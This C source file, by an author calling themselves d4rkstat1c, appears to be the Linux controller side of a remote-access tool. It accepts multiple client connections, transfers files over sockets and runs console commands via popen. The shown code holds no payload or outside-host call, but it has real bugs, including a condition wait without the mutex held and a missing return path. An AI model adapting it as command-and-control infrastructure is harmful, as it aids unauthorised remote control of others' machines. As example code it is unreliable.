/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#define LINUX 1
#define SOCKET int
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define INVALID_FILE -1
#define READ 1
#define WRITE 0

typedef int s_file;

// Mutex lock for pthread race condition checks.
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
// Variable for mutex condition.
pthread_cond_t  consum = PTHREAD_COND_INITIALIZER;

typedef struct {
	// Client hostname.
	char* host;

	// Client socket.
	SOCKET sock;

} Conn;

typedef struct {
	// Server buffer.
	char buf[BUFLEN + 1];

	// Server socket for accepting connections.
	int listen_socket;

	// Pthread object for handling execution/termination of accept_conns thread.
	pthread_t acp_thread;

	// Flag for race condition checks.
	int THRD_FLAG;

	// Array of Conn objects/structures.
	Conn* clients;

	// Memory blocks allocated.
	size_t clients_alloc;

	// Amount of memory used.
	size_t clients_sz;

} Server_map;

void bind_socket(const SOCKET listen_socket);
void sakito_accept_conns(Server_map *s_map);
void resize_conns(Server_map *s_map, int client_id);

void get_cwd(char *buf) {
	getcwd(buf, BUFLEN);
}

void terminate_server(int listen_socket, const char* const error) {
	close(listen_socket);
	int err_code = EXIT_SUCCESS;
	if (error) {
		err_code = 1;
		perror(error);
	}

	exit(err_code);
}

// Function to create socket.
int create_socket() {
	// Create the server socket object.
	int listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == -1) {
		perror("Socket creation failed.\n");
		exit(1); 
	} 
 
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) != 0)
		terminate_server(listen_socket, "Setting socket options failed.\n");
 
	return listen_socket;
}

void mutex_lock(Server_map* s_map) {
	// When THRD_FLAG evaluates to 0: execution has ended.
	while (s_map->THRD_FLAG)
		pthread_cond_wait(&consum, &lock);
	// If delete_client() is executing: wait for it to finish modifying s_map->clients to-
	// prevent race conditions from occurring.
	pthread_mutex_lock(&lock);

	// Set race condition flag to communicate with delete_client().
	s_map->THRD_FLAG = 1;
}

void mutex_unlock(Server_map* s_map) {
	// Unlock/release mutex..
	pthread_mutex_unlock(&lock);

	// Execution is finished so allow delete_client() to continue.
	s_map->THRD_FLAG = 0;
}

int sakito_tcp_send(SOCKET socket, const char* buf, const size_t count) {
	return write(socket, buf, count);
}

int sakito_tcp_recv(SOCKET socket, char* const buf, const size_t count) {
	return read(socket, buf, count);
}

int write_stdout(const char* buf, size_t count) {
	return write(STDOUT_FILENO, buf, count);
}

s_file sakito_open_file(const char* filename, int rw_flag) {
	if (rw_flag == WRITE)
		return open(filename, O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
	else if (rw_flag == READ)
		return open(filename, O_RDONLY);
}

int sakito_close_file(s_file file) {
	return close(file);
}

int sakito_recv_file(SOCKET socket, s_file file, char* const buf, int32_t f_size) {
	// Varaible to keep track of downloaded data.
	int i_result = SUCCESS;
	if (f_size > 0) {
		int32_t total = 0;
		do
			i_result = read(socket, buf, BUFLEN);
		while ((i_result > 0)
				&& (write(file, buf, i_result))
				&& ((total += i_result) != f_size));
	}
	return i_result;
}

int32_t sakito_file_size(s_file file) {
	int32_t f_size = (int32_t)lseek(file, 0, SEEK_END);
	// Return file descriptor to start of file.
	lseek(file, 0, SEEK_SET);
	return f_size;
}

int sakito_send_file(SOCKET socket, s_file file, char* const buf, int32_t f_size) {
	// Calculate file size and serialize the file size integer.
	uint32_t bytes = htonl(f_size);

	// Send the serialized file size bytes.
	if (write(socket, (char*)&bytes, sizeof(uint32_t)) < 1)
		return SOCKET_ERROR;

	// Send file bytes to client in BUFLEN chunks.
	int i_result = SUCCESS;
	if (f_size) {
		int bytes_read;
		while ((i_result > 0) && (bytes_read = read(file, buf, BUFLEN))) {
			// Send file's bytes chunk to remote server.
			i_result = write(socket, buf, bytes_read);
		}
	}
	return i_result;
}

// Function to execute command.
void exec_cmd(Server_map *s_map) {
	// Call Popen to execute command(s) and read the processes' output.
	FILE* fpipe = popen(s_map->buf, "r");

	// Stream/write command output to stdout.
	int rb = 0;
	do {
		rb = fread(s_map->buf, 1, BUFLEN, fpipe);
		fwrite(s_map->buf, 1, rb, stdout);
	} while (rb == BUFLEN);
 
	// Write single newline character to stdout for cmd line output alignment.
	fputc('\n', stdout);
 
	// Close the pipe.
	pclose(fpipe);
}

void terminate_console(Server_map *s_map) {
	// Quit accepting connections.
	pthread_cancel(s_map->acp_thread);

	// if there's any connections close them before exiting.
	if (s_map->clients_sz) {
		for (size_t i = 0; i < s_map->clients_sz; i++)
			close(s_map->clients[i].sock);
		// Free allocated memory.
		free(s_map->clients);
	}

	terminate_server(s_map->listen_socket, NULL);
}

// Thread to recursively accept connections.
void* accept_conns(void* param) {
	// Call sakito wrapper function to accept incoming connections.
	Server_map* s_map = (Server_map*)param;

	// Create our socket object.
	s_map->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(s_map->listen_socket);

	// Call wrapper function to accept incoming connections.
	sakito_accept_conns(s_map);

	return NULL;
}

void sakito_init(Server_map *s_map) {
	// Set out race condition flag to false.
	s_map->THRD_FLAG = 0;

	// Start our accept connections thread to recursively accept connections.
	pthread_create(&s_map->acp_thread , NULL, accept_conns, s_map);
}
